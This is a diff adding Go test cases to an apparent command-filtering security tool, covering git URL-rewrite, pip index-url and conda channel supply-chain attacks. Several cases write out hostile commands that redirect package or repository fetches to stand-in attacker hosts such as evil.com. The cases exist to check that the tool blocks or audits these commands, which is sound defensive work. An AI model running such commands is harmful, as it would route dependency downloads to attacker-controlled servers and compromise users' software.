@@ -470,6 +470,159 @@ var GoModReplaceCases = []TestCase{
 	},
 }
 
+// GitURLRewriteCases tests detection of git URL rewrite attacks.
+// Taxonomy: supply-chain/config-tampering/package-config-edit
+var GitURLRewriteCases = []TestCase{
+
+	// --- TRUE POSITIVES: Commands that MUST be blocked ---
+
+	{
+		ID:               "TP-SC-BLOCK-GITURLS-001",
+		Command:          `git config --global url."https://evil.com/".insteadOf "https://github.com/"`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/config-tampering/package-config-edit",
+		Analyzer:         "regex",
+		Description:      "git config url.*.insteadOf redirects all GitHub fetches to attacker domain — must be blocked.",
+		Tags:             []string{"tp", "supply-chain", "git", "url-rewrite"},
+	},
+	{
+		ID:               "TP-SC-BLOCK-GITURLS-002",
+		Command:          `git config url."https://attacker.example.com/org/".insteadOf "https://github.com/org/"`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/config-tampering/package-config-edit",
+		Analyzer:         "regex",
+		Description:      "Local git config url.*.insteadOf for org-level redirect — must be blocked.",
+		Tags:             []string{"tp", "supply-chain", "git", "url-rewrite"},
+	},
+
+	// --- TRUE NEGATIVES: Commands that MUST be allowed ---
+
+	{
+		ID:               "TN-SC-BLOCK-GITURLS-001",
+		Command:          `git config --global user.email "dev@example.com"`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/config-tampering/package-config-edit",
+		Analyzer:         "regex",
+		Description:      "Setting git user email does not trigger url.insteadOf rule — gets default AUDIT (git config is cautiously audited).",
+		Tags:             []string{"tn", "safe", "git"},
+	},
+	{
+		ID:               "TN-SC-BLOCK-GITURLS-002",
+		Command:          `git config --list`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/config-tampering/package-config-edit",
+		Analyzer:         "regex",
+		Description:      "git config --list is read-only but not in the allow-readonly prefix list — gets default AUDIT, not blocked.",
+		Tags:             []string{"tn", "safe", "git", "readonly"},
+	},
+}
+
+// PipIndexURLCases tests detection of pip --index-url attacks.
+// Taxonomy: supply-chain/dependency-confusion/non-standard-registry
+var PipIndexURLCases = []TestCase{
+
+	// --- TRUE POSITIVES: Commands that MUST be blocked ---
+
+	{
+		ID:               "TP-SC-BLOCK-PIPIDX-001",
+		Command:          `pip install requests --index-url https://evil-pypi.attacker.com/simple/`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
+		Analyzer:         "regex",
+		Description:      "pip install with --index-url pointing to attacker server replaces PyPI entirely — must be blocked.",
+		Tags:             []string{"tp", "supply-chain", "pip", "registry"},
+	},
+	{
+		ID:               "TP-SC-BLOCK-PIPIDX-002",
+		Command:          `pip3 install -r requirements.txt --index-url http://internal.corp.local/pypi/`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
+		Analyzer:         "regex",
+		Description:      "pip3 install from internal PyPI mirror via --index-url — audited, any non-PyPI primary index is a supply chain risk.",
+		Tags:             []string{"tp", "supply-chain", "pip", "registry"},
+	},
+
+	// --- TRUE NEGATIVES: Commands that MUST be allowed ---
+
+	{
+		ID:               "TN-SC-BLOCK-PIPIDX-001",
+		Command:          `pip install requests`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
+		Analyzer:         "regex",
+		Description:      "Standard pip install from PyPI — gets AUDIT from sc-audit-pip-install, no BLOCK.",
+		Tags:             []string{"tn", "safe", "pip"},
+	},
+	{
+		ID:               "TN-SC-BLOCK-PIPIDX-002",
+		Command:          `pip install --upgrade pip`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
+		Analyzer:         "regex",
+		Description:      "pip self-upgrade from default PyPI — gets AUDIT, no BLOCK.",
+		Tags:             []string{"tn", "safe", "pip"},
+	},
+}
+
+// CondaChannelCases tests detection of conda/mamba installs from non-standard channels.
+// Taxonomy: supply-chain/dependency-confusion/non-standard-registry
+var CondaChannelCases = []TestCase{
+
+	// --- TRUE POSITIVES: Commands that MUST be audited/blocked ---
+
+	{
+		ID:               "TP-SC-AUDIT-CONDA-001",
+		Command:          `conda install numpy -c https://evil-packages.attacker.com/conda/`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
+		Analyzer:         "regex",
+		Description:      "conda install from URL-based channel bypasses verified conda-forge — must be audited.",
+		Tags:             []string{"tp", "supply-chain", "conda"},
+	},
+	{
+		ID:               "TP-SC-AUDIT-CONDA-002",
+		Command:          `mamba install pytorch -c https://internal.corp.local/conda-channel/`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
+		Analyzer:         "regex",
+		Description:      "mamba install from internal URL channel — audited for supply chain review.",
+		Tags:             []string{"tp", "supply-chain", "mamba", "conda"},
+	},
+
+	// --- TRUE NEGATIVES: Commands that MUST be allowed ---
+
+	{
+		ID:               "TN-SC-AUDIT-CONDA-001",
+		Command:          `conda install numpy -c conda-forge`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
+		Analyzer:         "regex",
+		Description:      "conda install from verified conda-forge (named channel, not URL) does not trigger sc-audit-conda-channel — gets default AUDIT for package installs.",
+		Tags:             []string{"tn", "safe", "conda"},
+	},
+	{
+		ID:               "TN-SC-AUDIT-CONDA-002",
+		Command:          `conda install -c defaults scipy`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/dependency-confusion/non-standard-registry",
+		Analyzer:         "regex",
+		Description:      "conda install from official defaults channel (not URL) does not trigger sc-audit-conda-channel — gets default AUDIT.",
+		Tags:             []string{"tn", "safe", "conda"},
+	},
+}
+
 // AllSupplyChainCases returns all test cases for Kingdom 7.
 func AllSupplyChainCases() []TestCase {
 	var all []TestCase
@@ -477,5 +630,8 @@ func AllSupplyChainCases() []TestCase {
 	all = append(all, PackageInstallCases...)
 	all = append(all, ModelPoisoningCases...)
 	all = append(all, GoModReplaceCases...)
+	all = append(all, GitURLRewriteCases...)
+	all = append(all, PipIndexURLCases...)
+	all = append(all, CondaChannelCases...)
 	return all
 }
